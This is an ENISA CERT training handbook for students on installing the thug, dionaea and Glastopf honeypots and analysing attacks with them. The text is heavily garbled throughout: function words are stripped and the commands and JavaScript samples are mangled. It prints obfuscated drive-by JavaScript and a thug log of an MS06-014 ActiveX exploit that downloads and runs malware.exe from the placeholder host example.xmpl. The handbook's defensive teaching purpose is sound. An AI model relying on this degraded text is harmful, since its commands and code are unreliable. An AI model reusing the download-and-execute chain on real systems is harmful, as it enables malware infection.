Honeypots CERT Exercise Toolset Document students Deliverable 2012 - 10 - 07 I Honeypots CERT Exercise Toolset Document students Contributors report The report production commissioned CERT Polska NASK CERT Polska/NASK Editors/Testers Piotr Kijewski CERT Polska/NASK Cosmin Ciobanu ENISA Romain Bourgue ENISA Andreas Sfakianakis ENISA Acknowledgements ENISA wants thank institutions persons contributed document A special Kara Nance University Alaska Honeynet Project Lukas Rist Honeynet Project II Honeypots CERT Exercise Toolset Document students About ENISA The European Network Information Security Agency ENISA centre network citizens ENISA works groups develop advice recommendations good practice information security It assists EU Member States implementing relevant EU cture networks ENISA seeks enhance existing expertise EU Member States supporting development cross - border communities committed improving network information security throughout EU More information ENISA work found www.enisa.europa.eu Follow us Facebook Twitter LinkedIn Youtube & RSS feeds Contact details For contacting ENISA general enquiries CERT - related information please use following details opsec @ enisa.europa.eu Internet http //www.enisa.europa.eu Legal notice Notice must taken publication represents views interpretations authors editors unless stated otherwise This publication construed legal action ENISA ENISA bodies unless adop ted pursuant ENISA Regulation EC No 460/2004 lastly amended Regulation EU No 580/2011 This publication necessarily represent state - - art ENISA may update time time Third - party sources quoted appropriat e. ENISA responsible content external sources including external websites referenced publication This publication intended information purposes It must accessible free charge Neither ENISA person cting behalf responsible use might made information contained publication Reproduction authorised provided source acknowledged Â© European Network Informati Security Agency ENISA 2012 III Honeypots CERT Exercise Toolset Document students Contents 1 EXERCISE HONEYPOTS ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... 1 1.1 W HAT W ILL Y OU L EARN ? ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... 1 1.2 E XERCISE T ASKS ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... 1 1.3 H ONEYPOT E XERCISE V IRTUAL I MAGE ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... .. 1 1.4 PART 1 C LIENT - SIDE HONEYPOT INVESTIGATION OF A M ALICIOUS WEBSITE ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... .. 1 1.4.1 Task 1 deployment honeypot ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... 2 1.4.2 Task 2 Introduction step - - step demonstration using sample URL ... ... ... ... ... ... ... ... ... ... .. ... ... 3 1.4.3 Task 2 - Assessment ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... 9 1.4.4 Task 3 Analysis second URL described incident report ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... 9 1.4.5 Task 3 - Assessment ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... 9 1.5 PART 2 S ERVER - SIDE HONEYPOT S CENARIO 1 INVESTIGATION OF A W ORM IN A LAN ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... 10 1.5.1 Task 1 - Deployment honeypot ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... .. 10 1.5.2 Task 2 Introduction st ep - - step analysis ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... 11 1.5.3 Task 2 - Assessment ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... .. 12 1 5.4 Task 3 Analysis second attack ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... 13 1.5.5 Task 3 - Assessment ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... .. 13 1.6 PART 2 S ERVER - SIDE HONEYPOT S CENARIO 2 INVESTIGATION OF A R EMOTE ATTACK TARGETI NG A WEB APPLICATION ... 13 1.6.1 Task 1 Deployment honeypot ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... 13 1.6.2 Task 2 introduction step - - step analysis ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... 14 1.6.3 Task 2 - Assessment ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... .. 16 1.6.4 Task 3 Analysis second attack ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... 17 1.6.5 Task 3 - Assessment ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... ... ... ... ... .. ... ... ... ... ... ... .. 17 1 Honeypots CERT Exercise Toolset Document students Honeypots CERT Exercise Toolset 1 Exercise Honeypots 1.1 What Will You Learn ? The objective Honeypots E xercise familiaris e two kinds honeypots server - side honeypot client - side honeypots In particular Learn install configure three honeypots thug 1 dionaea 2 Glastopf 3 Learn use analy e security threats Learn client - side attacks spread using web browser vulnerabilities Learn server - side threats like worm outbreak web application remote attack 1.2 Exercise Tasks The exercise divided wo different PARTS three scenarios At start exercise given brief intr oduction field honeypot technology client - side server - side threats The exercise structured follows PART 1 Client - side honeypot web - based attack exploiting browser Scenario conducting investigation incident report malicious behavio u r web site PART 2 Server - side honeypot active attack targeting server services Scenario 1 conducting investigation incident report new worm spreading LAN Scenario 2 conducting investigation incident report new attack targeting web application running web server 1.3 Honeypot Exercise Virtual Image A Honeypot Exercise Virtual Image required conduct exercise It provide materials needed carry exercise The teacher give image Note need password use image 1.4 PART 1 C lient - side honeypot investigation malicious website The first part exercise divided three separate tasks 1. deployment client - side honeypot 2. introductory step - - step analysis website 1 https //github.com/buffer/thug 2 http //dionaea.carnivore.it 3 http //glastopf.org 2 Honeypots CERT Exercise Toolset Document students 3. analysis another web site reported malicious Please follow 1.4.1 Task 1 deployment honeypot Using following please install configure thug client - side low - interaction honeypot Thug low - interaction client honeypot focused detection malicious web pages It emulates b ehavio u r typical web browser The tool uses Google V8 JavaScript engine implements Document Object Model DOM Thug written Python made available GNU General Public License Your f irst task deployment tool All required files pre - loaded suppl ied Honeypot Exercise Virtual Image installation process require Internet connection Some dependencies already installed meet requirements However wish read full installation steps list described http //buffer.github.com/thug/doc/build.html All steps described document installation derived documentation see URL All needed repositories cloned /opt/ directory /opt/libemu /opt/pylibemu /opt/pyv8 /opt/thug /opt/v8 STEP 1 Installation Google V8/PyV8 Google V8 V8 source code needs patched order properly work thug $ cd /opt /opt $ cp thug/patches/V8 - patch* /opt $ patch - p0 < V8 - patch1.diff patching file v8/src/log.h /opt $ patc h - p0 < V8 - patch2.diff PyV8 Python wrapper Google V8 engine In order install PyV8 perform following steps /opt $ export V8_HOME=/opt/v8 /opt $ cd pyv8 /opt/pyv8 $ python setup.py build /opt/pyv8 $ sudo python setup.py install Testing installation /opt/pyv8 $ python PyV8.py If problems occur V8 PyV8 installed properly 3 Honeypots CERT Exercise Toolset Document students Honeypots CERT Exercise Toolset STEP 2 Installation libemu Libemu small library written C provides basic x86 emulation shellcode detection using GetPC heur istics More information libemu found project webpage http //libemu.carnivore.it/ In order install libemu please follow steps $ cd /opt/libemu /opt/libemu $ autoreconf - v - /opt/ libemu $ ./configure -- prefix=/usr /opt/libemu $ sudo make install STEP 3 Installation Pylibemu Pylibemu Cython C - Extensions Python wrapper libemu library It written author thug More information pylibemu found project webpage https //github.com/buffer/pylibemu In order install pylibemu please follow steps $ cd /opt/pylibemu/ /opt/pylibemu $ python setup.py build /opt/pylibemu $ sudo python setup.py install 1.4.2 Task 2 Introduction step - - step demonstration using sample URL In task lead step - - step analysis malicious web page using thug L ist en carefully observe actions explanations You encouraged p articipate actively discussions interact teacher students To begin please start Apache server $ sudo /etc/init.d/apache2 start STEP 1 The usage thug main options described help Please use following commands $ cd /opt/thug/src/ $ python thug.py -- help Next open Icedove e - mail client read incident report number 001 The report contains URL potentially malicious content STEP 2 To investigate suspicious URL incident report use thug following manner $ cd /opt/thug/src/ $ python thug.py http //example.xmpl/ex1.html 2012 - 07 - 27 16:26:54 HTTP URL http //example .xmpl/ex1.html Status 200 Referrer None 2012 - 07 - 27 16:26:54 < iframe src= '' http //example.xmpl/ex2.html '' > < /iframe > 4 Honeypots CERT Exercise Toolset Document students 2012 - 07 - 27 16:26:54 iframe redirection http //example.xmpl/ex1.html - > http //example.xmpl/ex2.html 2012 - 07 - 27 16:26:54 HTTP URL http //example.xmpl/ex2.html Status 200 Referrer http //example.xmpl/ex1.html 2012 - 07 - 27 16:26:54 HTTP URL http //example.xmpl/ex2.html Status 200 Referrer http //example.xmpl/ex2.html 2012 - 07 - 27 16:26:55 < iframe src= '' http //example.xmpl/ex3.html '' > < /iframe > 2012 - 07 - 27 16:26:55 iframe redirection http //example.xmpl/ex2.html - > http //example.xmpl/ex3.html 2012 - 07 - 27 16:26:55 HTTP URL http //example.xmpl/ex3.html Status 200 Referrer http //example.xmpl/ex2.html 2012 - 07 - 27 16:26:55 HTTP URL http //example.xmpl/ex3.html Status 200 Referrer http //example.xmpl/ex3.html 2012 - 07 - 27 16:26:55 Window Alert Text using Internet Explorer 7 2012 - 07 - 27 16:26:55 Saving log analysis .. /logs/edafe606e244823362675990fe56b5f1/20120727162653 The important results w ere marked red note standard utput could logged file using - -- - - step attack description http //example.xmpl/ex1.html redirects http //example.xmpl/ex2.html On next page ex2.html http //example.xmpl/ex3.html page text STEP 3 Please follow instructions presented teacher order display additional details content web sites Java Scripts In particular obtain following results Ad.1 The first generated obfuscated JavaScript information obfuscation JS found http //www.honeynet.org/node/187 full content < html > Some legitimate content < script > //suspicious JS var _0xd02b= `` \ x3C \ x69 \ x66 \ x72 \ x61 \ x6D \ x65 \ x20 \ x73 \ x72 \ x63 \ x3D \ x22 \ x68 \ x74 \ x74 \ x70 \ x3A \ x2F \ x 2F \ x65 \ x78 \ x61 \ x6D \ x70 \ x6C \ x65 \ x2E \ x78 \ x6D \ x70 \ x6C \ x2F \ x65 \ x78 \ x32 \ x2E \ x68 \ x74 \ x6D \ x6C \ x 22 \ x3E \ x3C \ x2F \ x 69 \ x66 \ x72 \ x61 \ x6D \ x65 \ x3E '' '' \ x77 \ x72 \ x69 \ x74 \ x65 '' document _0xd02b 1 _0xd02b 0 < /script > < /html > Ad.2 The second also generated JavaScript obfuscated full content < html > < script > //suspicious JS /MSIE \ d+ \ \ d+ /.test navigator.userAgent { var ieversion=new Number RegExp. $ 1 1 2 3 1 2 3 5 Honeypots CERT Exercise Toolset Document students Honeypots CERT Exercise Toolset ieversion==7 document.write `` < iframe src= \ '' http //example.xmpl/malicious.html \ '' > < /iframe > '' else document.write `` < iframe src= \ '' http //example.xmpl/ex3.html \ '' > < /iframe > '' } else document.write `` < iframe src= \ '' http //example.xmpl/ex4.html \ '' > < /iframe > '' < /script > < /html > Discuss behaviour JavaScript functions Ad.3 On last page alert generated heavily obfuscated piece JavaScr ipt The content < html > < script > //suspicious JS $ =~ $ = { ___ ++ $ $ $ $ $ ! + '' '' $ __ $ ++ $ $ _ $ _ ! + '' '' $ _ $ _ ++ $ $ _ $ $ { } + '' '' $ $ $ _ $ $ $ + '' '' $ _ $ $ ++ $ $ $ $ _ ! `` `` + '' '' $ $ __ ++ $ $ _ $ ++ $ $ $ __ { } + '' '' $ $ $ _ ++ $ $ $ $ ++ $ $ _ __ ++ $ $ __ $ + + $ } $ $ _= $ $ _= $ + '' '' $ $ _ $ + $ ._ $ = $ $ _ $ .__ $ + $ $ $ = $ $ + '' '' $ .__ $ + ! $ + '' '' $ ._ $ $ + $ .__= $ $ _ $ $ $ _ + $ $ = ! '' '' + '' '' $ .__ $ + $ ._= ! `` `` + '' '' $ ._ $ _ + $ $ _ $ $ _ $ + $ .__+ $ ._ $ + $ $ $ $ $ = $ $ + ! `` `` + '' '' $ ._ $ $ + $ .__+ $ ._+ $ $ + $ $ $ $ $ = $ .___ $ $ _ $ $ _ $ $ $ $ $ $ $ + '' \ '' '' + $ $ _ $ _+ ! + '' '' $ ._ $ _ + $ $ $ $ _+ '' \ \ '' + $ .__ $ + $ $ $ _+ $ ._ $ _+ $ .__+ '' \ \ \ '' \ \ '' + $ .__ $ + $ $ $ $ + $ .__ $ + $ ._ $ + $ ._+ '' \ \ '' + $ $ __+ $ .___+ $ $ _ $ _+ '' \ \ '' + $ .__ $ + $ $ $ _+ $ ._ $ _+ $ $ $ $ _+ '' \ \ '' + $ $ __+ $ .___+ $ ._+ '' \ \ '' + $ .__ $ + $ $ $ _+ $ ._ $ $ + '' \ \ '' + $ .__ $ + $ $ _ $ + $ .__ $ + '' \ \ '' + $ .__ $ + $ $ _ $ + $ $ $ _+ '' \ \ '' + $ .__ $ + $ $ _ _+ $ $ $ $ + '' \ \ '' + $ $ __+ $ .___+ '' \ \ '' + $ .__ $ + $ .__ $ + $ .__ $ + '' \ \ '' + $ .__ $ + $ $ _ $ + $ $ $ _+ $ .__+ $ $ $ $ _+ '' \ \ '' + $ .__ $ + $ $ $ _+ $ ._ $ _+ '' \ \ '' + $ .__ $ + $ $ _ $ + $ $ $ _+ $ $ $ $ _+ $ .__+ '' \ \ '' + $ $ __+ $ .___+ '' \ \ '' + $ .__ $ + $ .___+ $ $ _ $ + '' \ \ '' + $ .__ $ + $ $ $ $ + $ .___+ '' \ \ '' + $ .__ $ + $ $ $ _+ $ .___+ ! + '' '' $ ._ $ _ + $ ._ $ + '' \ \ '' + $ .__ $ + $ $ $ _ + $ ._ $ _+ $ $ $ $ _+ '' \ \ '' + $ .__ $ + $ $ $ _+ $ ._ $ _+ '' \ \ '' + $ $ __+ $ .___+ '' \ \ '' + $ .__ $ + $ $ _ $ + $ $ $ _+ $ ._ $ + $ .__+ '' \ \ '' + $ $ __+ $ .___+ $ $ $ $ + '' \ \ \ '' \ \ '' + $ $ __+ $ .___+ '' '' + '' \ '' '' < /script > < /html > According http //example.xmpl/ex1.html malicious could described suspicious due redirects iframes obfuscated JavaScripts Note thug uses Internet Explorer 6.1 Windows XP default personality user agent In regard STEP 2 A d.2 analysis second JavaScript generate different content depending browser type The next step b e repeat whole analysis using Internet Explorer 7 IE7 user agent I f JavaScript readable example obfuscated perform analysis using available thug personalities user agents STEP 4 To run thug IE7 pe rsonality use - $ python thug.py - u winxpie70 http //example.xmpl/ex1.html 2012 - 07 - 27 17:35:56 HTTP URL http //example.xmpl/ex1.html Status 200 Referrer None 2012 - 07 - 27 17:35:57 < iframe src = '' http //example.xmpl/ex2.html '' > < /iframe > http //example.xmpl/ex2.html 2012 - 07 - 27 17:35:57 HTTP URL http //example.xmpl/ex2.html Status 200 Referrer http //example.xmpl/ex1.html 2012 - 07 - 27 17:35:57 HTTP URL http //example.xmpl/ex2.html Stat us 200 Referrer http //example.xmpl/ex2.html 2012 - 07 - 27 17:35:57 < iframe src= '' http //example.xmpl/malicious.html '' > < /iframe > 2012 - 07 - 27 17:35:57 iframe redirection http //example.xmpl/ex2.html - > http //example.xmpl/malicious.html 2 1 6 Honeypots CERT Exercise Toolset Document students 2012 - 07 - 27 17:35:57 HTTP URL http //example.xmpl/malicious.html Status 200 Referrer http //example.xmpl/ex2.html 2012 - 07 - 27 17:35:57 HTTP URL http //example.xmpl/malicious.html Status 200 Referrer http //example.xmpl/malicious.html 2012 - 07 - 27 17 35:58 Microsoft MDAC RDS.Dataspace ActiveX CreateObject msxml2.XMLHTTP 2012 - 07 - 27 17:35:58 ActiveXObject msxml2.xmlhttp 2012 - 07 - 27 17:35:58 Microsoft MDAC RDS.Dataspace ActiveX CreateObject ADODB.Stream 2012 - 07 - 27 17:35:58 ActiveXObject adodb.stream 2012 - 07 - 27 17:35:58 Microsoft MDAC RDS.Dataspace ActiveX CreateObject WScript.Shell 2012 - 07 - 27 17:35:58 ActiveXObject wscript.shell 2012 - 07 - 27 17:35:58 Microsoft XMLHTTP ActiveX Fetching URL http //example.xmpl/malware.exe 2012 - 07 - 27 17:35:58 HTTP URL http //example.xmpl/malware.exe Status 200 Referrer http //example.xmpl/malicious.html 2012 - 07 - 27 17:35:58 Microsoft XMLHTTP ActiveX Saving File 69630e4574ec6798239b091cda43dca0 2 012 - 07 - 27 17:35:58 Microsoft XMLHTTP ActiveX send 2012 - 07 - 27 17:35:58 Adodb.Stream ActiveX open 2012 - 07 - 27 17:35:58 Adodb.Stream ActiveX Write 2012 - 07 - 27 17:35:58 Adodb.Stream ActiveX SaveToFile c \ sysbmqa.exe 2012 - 07 - 27 17:35:58 A dodb.Stream ActiveX Close 2012 - 07 - 27 17:35:58 WScript.Shell ActiveX Executing c \ sysbmqa.exe 2012 - 07 - 27 17:35:58 Saving log analysis ../logs/edafe606e244823362675990fe56b5f1/20120727173556 The important entries marked red note tha standard output - -- - - step description http //example.xmpl/ex1.html redirects http //example.xmpl/ex2.html On next page ex2.html http //example.xmpl/malicious.html ActiveX object created The ActiveX object uses functions msxml2.xml http adodb.stream wscript.shell fetch file probably windows executable http //example.xmpl/malware.exe write c \ sysbmqa.exe STEP 5 F ollow instructions presented teacher order display details conte nt web sites Java Scripts In particular able obtain following results Ad.1 Similar STEP 3 Ad 1 Ad.2 This JavaScript behavio u r different script generated different iframe tha n first case < html > < script > //suspicious JS /MSIE \ d+ \ \ d+ /.test navigator.userAgent { 1 2 3 4 3 4 7 Honeypots CERT Exercise Toolset Document students Honeypots CERT Exercise Toolset var ieversion=new Number RegExp. $ 1 ieversion==7 document.write `` < iframe src= \ '' http //example.xmpl/malicious.html \ '' > < /iframe > '' else document.write `` < iframe src= \ '' http //example.xmpl/ex3.html \ '' > < /iframe > '' } else document.write `` < iframe src= \ '' http //example.xmpl/ex4.html \ '' > < /iframe > '' < /script > < /html > Ad.3 On next page http //example.xmpl/malicious.html ActiveX exploit JavaScript see thug log file exploits vulnerability Internet Explorer MS06 - 014 4 CVE - 2006 - 0003 order fetch file http //example.xmpl/malware.exe execute The exploit analy ed using external tools services example VirusTotal 5 Wepawet 6 Additional analyses part exercise extend beyond honeypot objective Ad.4 The file http //example.xmpl/malware.exe analyse using external tools ser vices example VirusTotal Additional analyses part exercise This file n EICAR test signature file marke malicious testing purposes antivirus engines The overall analysis result URL h ttp //example.xmpl/ex1.html malicious victim uses Internet Explorer 7.0 web browser STEP 6 You perform analyses using available thug browser personalities All Internet Explorer personalities generate result first case When u sing user agent different Internet Explorer behavio u r also similar first case apart last redirection last web page $ python thug.py - u winxpchrome20 http //example.xmpl/ex1.html 2012 - 07 - 27 18:23:35 HTTP URL http //example.xmpl/ex1.html Status 200 Referrer None 2012 - 07 - 27 18:23:36 < iframe src= '' http //example.xmpl/ex2.html '' > < /iframe > 2012 - 07 - 27 18:23:36 iframe redirection http //example.xmpl/ex1.html - > http //example.xmpl/ex2.html 2012 - 07 - 27 18:23:36 HTTP URL http //example.xmpl/ex2.html Status 200 Referrer http //example.xmpl/ex1.html 2012 - 07 - 27 18:23:36 HTTP URL http //example.xmpl/ex2.html Status 200 Referrer http //example.xmpl/ex2.html 2012 - 07 - 27 18:23:37 < iframe src= '' http //example.xmpl/ex4.html '' > < /iframe > 2012 - 07 - 27 18:23:37 iframe redirection http //example.xmpl/ex2.html - > http //example.xmpl/ex4.html 2012 - 07 - 27 18:23:37 HTTP URL http //example.xmpl/ex4.html Status 200 Referrer http //example.xmpl/ex2.html 2012 - 07 - 27 18:23:37 HTTP URL http //example.xmpl/ex4.html Status 200 Referrer http //example.xm pl/ex4.html 4 http //technet.microsoft.com/en - us/security/bulletin/ms06 - 014 5 http //www.virustotal.com 6 http //www.wepawet.iseclab.org 1 2 3 8 Honeypots CERT Exercise Toolset Document students 2012 - 07 - 27 18:23:37 Window Alert Text using Internet Explorer 2012 - 07 - 27 18:23:37 Saving log analysis ../logs/edafe606e244823362675990fe56b5f1/20120727182335 The important entries marked red note standard utput could logged - -- - - step description http //example.xmpl/ex1.html redirects http //example.xmpl/ex2.html On next page ex2.html http //example.xmpl/ex4.html ex4.html STEP 7 In manner STEP 3 STEP 5 please follow instru ctions presented teacher order display details content web sites JavaScript In particular able obtain following results going steps described Ad.1 Similar STEP 3 Ad 1 STEP 5 Ad 1 Ad.2 This JavaScript behavio u r different script generated different iframe first second case < html > < script > //suspicious JS /MSIE \ d+ \ \ d+ /.test navigator.userAgent { var ieversion=new Number RegExp. $ 1 ieversion==7 document.write `` < iframe src= \ '' http //example.xmpl/malicious.html \ '' > < /iframe > '' else document.write `` < iframe src= \ '' http //example.xmpl/ex3.html \ '' > < /iframe > '' } else document.write `` < iframe src= \ '' htt p //example.xmpl/ex4.html \ '' > < /iframe > '' < /script > < /html > Ad.3 On last page alert generated heavily obfuscated piece JavaScript < html > < script > //suspicious JS $ =~ $ = { ___ ++ $ $ $ $ $ ! + '' '' $ __ $ ++ $ $ _ $ _ ! + '' '' $ _ $ _ ++ $ $ _ $ $ { } + '' '' $ $ $ _ $ $ $ + '' '' $ _ $ $ ++ $ $ $ $ _ ! `` `` + '' '' $ $ __ ++ $ $ _ $ ++ $ $ $ __ { } + '' '' $ $ $ _ ++ $ $ $ $ ++ $ $ _ __ ++ $ $ __ $ ++ $ } $ $ _= $ $ _= $ + '' '' $ $ _ $ + $ ._ $ = $ $ _ $ .__ $ + $ $ $ = $ $ + '' '' $ .__ $ + ! $ + '' '' $ ._ $ $ + $ .__= $ $ _ $ $ $ _ + $ $ = ! '' '' + '' '' $ .__ $ + $ ._= ! `` `` + '' '' $ ._ $ _ + $ $ _ $ $ _ $ + $ .__+ $ ._ $ + $ $ $ $ $ = $ $ + ! `` `` + '' '' $ ._ $ $ + $ .__+ $ ._+ $ $ + $ $ $ $ $ = $ .___ $ $ _ $ $ _ $ $ $ $ $ $ $ + '' \ '' '' + $ $ _ $ _+ ! + '' '' $ ._ $ _ + $ $ $ $ _+ '' \ \ '' + $ .__ $ + $ $ $ _+ $ ._ $ _+ $ .__+ '' \ \ \ '' \ \ '' + $ .__ $ + $ $ $ $ + $ .__ $ + $ ._ $ + $ ._+ '' \ \ '' + $ $ __+ $ .___+ $ $ _ $ _+ '' \ \ '' + $ .__ $ + $ $ $ _+ $ ._ $ _+ $ $ $ $ _+ '' \ \ '' + $ $ __+ $ .___+ '' \ \ '' + $ .__ $ + $ $ _ $ + $ $ $ _+ $ ._ $ + $ .__+ '' \ \ '' + $ $ __+ $ .___+ $ ._+ '' \ \ '' + $ .__ $ + $ $ $ _+ $ ._ $ $ + '' \ \ '' + $ .__ $ + $ $ _ $ + $ .__ $ + '' \ \ '' + $ .__ $ + $ $ _ $ + $ $ $ _+ '' \ \ '' + $ .__ $ + $ $ __+ $ $ $ $ + '' \ \ '' + $ $ __+ $ .___+ '' \ \ '' + $ .__ $ + $ __ $ + $ .__ $ + '' \ \ '' + $ .__ $ + $ $ _ $ + $ $ $ _+ $ .__+ $ $ $ $ _+ '' \ \ '' + $ .__ $ + $ $ $ _+ $ ._ $ _+ '' \ \ '' + $ .__ $ + $ $ _ $ + $ $ $ _+ $ $ $ $ _+ $ .__+ '' \ \ '' + $ $ __+ $ .___+ '' \ \ '' + $ .__ $ + $ .___+ $ $ _ $ + '' \ \ '' + $ .__ $ + $ $ $ $ + $ .___+ '' \ \ '' + $ .__ $ + $ $ $ _+ $ .___+ ! + '' '' $ ._ $ _ + $ ._ $ + '' \ \ '' + $ .__ $ + $ $ $ _+ $ ._ $ _+ $ $ $ $ _+ '' \ \ '' + $ .__ $ + $ $ $ _+ $ ._ $ _+ '' \ \ \ '' \ \ '' + $ $ __+ $ .___+ '' '' + '' \ '' '' 1 2 3 9 Honeypots CERT Exercise Toolset Document students Honeypots CERT Exercise Toolset < /scr ipt > < /html > The overall analysis result URL http //example.xmpl/ex1.html malicious victim uses browser Internet Explorer 1.4.3 Task 2 - Assessment Please detail Is web site malicious ? b How attack carried ? Describe step step could presented flow diagram c. What domain names IP addresses involved attack ? d. Which browsers targeted ? e. Which vulnerabilities exploited ? f. How could mitigate attack ? Together teacher try reconstruct attack flow diagram The teacher show 1.4.4 Task 3 Analysis second URL described incident report Using tools knowle dge ac quired previous tasks analy e web site reported malicious incident report 002 e - mail inbox Honeypot Exercise Virtual Image instructions carry exercise 1.4.5 Task 3 - Assessment Answer following questions malicious URL report Is web site malicious ? b How attack carried ? Describe step step could presented flow diagram c. What domain names IP addresses involved attack ? d. Which browsers targeted ? e. Which vulnerabilities exploited ? f. How could mitigate attack ? Once PART 1 exercise please stop Apache server 10 Honeypots CERT Exercise Toolset Document students $ sudo /etc/init.d/apache2 stop 1.5 PART 2 S erver - side honeypot S cenario 1 investigation worm LAN The aim PART 2 Scenario 1 exercise gain familiarity honeypot detect worm outbreak network environment This part exercise divided three separate tasks 1. deployment server - side honeypot 2. introductory step - - step analysis attack 3. analysis another attack detected honeypot In scenario dionaea honeypot going used L isten carefully instruction 1.5.1 Task 1 - D eployment honeypot install configure dionaea server - side low - interaction honeypot Dionaea Nepenthes successor low - interaction honeypot The main p urpose honeypot collect malware It features modular architecture embedding python scripting language order emulate protocols It able detect shellcodes using libemu 7 supports IPv6 TLS Dionaea runs restricted environment without administrative privileges The f irst task install honeypot All required files already pre - loaded suppl ied Honeypot Exercise Virtual Image Most software packages already installed The nstallation p rocess described document found dionaea website 8 source code located /opt dire ctory The following steps walk compilation process First install software packages Cython $ cd /opt/Cython - 0.16 $ sudo python3.2 setup.py install liblcfg $ cd /opt/liblcfg/code $ autoreconf - vi $ ./configure -- prefix=/opt/dionaea $ make install 7 http //libemu.carnivore.it/ 8 http //dionaea.carnivore.it/ # compiling 11 Honeypots CERT Exercise Toolset Document students Honeypots CERT Exercise Toolset libemu $ cd /opt/libemu $ autoreconf - vi $ ./configure -- prefix=/opt/dionaea $ sudo make install Second install dionaea I source code located /opt directory The honeypot compiled using following commands $ cd /opt/dionaea $ autoreconf - vi $ ./configure -- - lcfg - include=/opt/dionaea/include/ \ -- - lcfg - lib=/opt/dionae a/lib/ \ -- - emu - include=/opt/dionaea/include/ \ -- - emu - lib=/opt/dionaea/lib $ make $ sudo make install 1.5.2 Task 2 Introduction step - - step analysis In task le step - - step investigation worm outbreak using dionaea Listen carefully actions explanations You encouraged p articipate actively discussions interact teacher students STEP 1 learn configuration modules The configuration file located /opt/dionaea/etc/dionaea/dionaea.conf Next follow listen description startup option s. These displayed using - h flag $ /opt/ dionaea/bin/ dionaea - h STEP 2 F ollow learn run dionaea honeypot e.g $ sudo /opt/dionaea/bin/ dionaea - r /opt/dionaea STEP 3 Listen carefully If doe ay otherwise r un attack simulation $ /opt/exercises/exercise2.1 Pleas e run script non - isolated network ! Note T eacher run attack virtual machine case run attack simulation described 12 Honeypots CERT Exercise Toolset Document students STEP 4 Check log file /opt/dionaea/var/log/dioanea.log incoming connections look possible attack indicat 17082012 13:06:45 connection connection.c:4337 - message connection 0x945d000 accept/udp/established 127.0.0.1:5060 - > 127.0.1.1:5066 state established - > established 17082012 13:06:45 logsql dionaea/logsql.py:618 - info connect connection 127.0.1.1/:5066 127.0.0.1:5060 id=396 17082012 13:06:45 sip dionaea/sip/__init__.py:649 - info Received OPTIONS 17082012 13:06:45 sip dionaea/sip/rfc3261.py:463 - info Creating Response code=200 message=None In listing main fragments attack marked red In case attacker used SIP scanner determine SIP methods provi ded Since type scanning using OPTIONS method called SIP OPTIONS scanning STEP 5 Use following provided readlogsqltree script display attacks last day The script queries logsql sqlite database attacks prints related information every attack The tool provides information exploited vulnerability time attacker information shellcode file offered download $ python 3.2 /opt/dionaea/bin/readlogsqltree - $ date '+ % ' - 24*3600 /opt/dionaea/var/dionaea/logsql.sqlite 2012 - 08 - 17 13:06:45 connection 396 SipSession udp connect 127.0.0.1:5060 - > /127.0.1.1:5066 396 None Method OPTIONS Call - ID:3883276957 @ 127.0.0.1 User - Agent HjtMN0 addr < > 'sip nobody @ 127.0.0.1 None' < > 'sip nobody @ 127.0.0.1 None' contact < > 'sip nobody @ 127.0.0.1 None' < > 'sip HjtMN0 @ 127.0.0.1:5066' via 'UDP/127.0.0.1:5066 1.5.3 Task 2 - Assessment Please What vulnerability targeted ? b What source attack ? c. Were files sent attacker ? If describe d. How could attack mitigated ? 13 Honeypots CERT Exercise Toolset Document students Honeypots CERT Exercise Toolset 1.5.4 Tas k 3 Analysis second attack Using tools knowledge ac quired previous tasks analy e network traffic reaching honeypot Listen carefully run second attack simulation 1.5.5 Task 3 - Assessment Answer following questions detail What vulnerability targeted ? b What source attack ? c. Were files sent attacker ? If describe d. How could attack mitigated ? 1.6 PART 2 S erver - side honeypot S cenario 2 investigation remote attack targeting web application The aim PART 2 S cenario 2 exercis e familiaris e honeypot detect attack web application running web server This part exercise divided three separate tasks 1. deployment server - side honeypot 2. step - - step introduction attack web application 3. analysis another attack detected honeypot In scenario Glast opf honeypot going used L isten 1.6.1 Task 1 Deployment honeypot Using following ns please install configure Glastopf server - side low - interaction honeypot In part exercise G lastopf honeypot going used Glastopf honeypot emulates thousands vulnerabilities gather data attacks targeting web applications The principle behind simple return expected response http //glastopf.org/ The first task install honeypot All required files already downloaded Honeypot Exercise Virtual Machine image All software dependencies already installed The nstall ation process described document found Glastopf website http 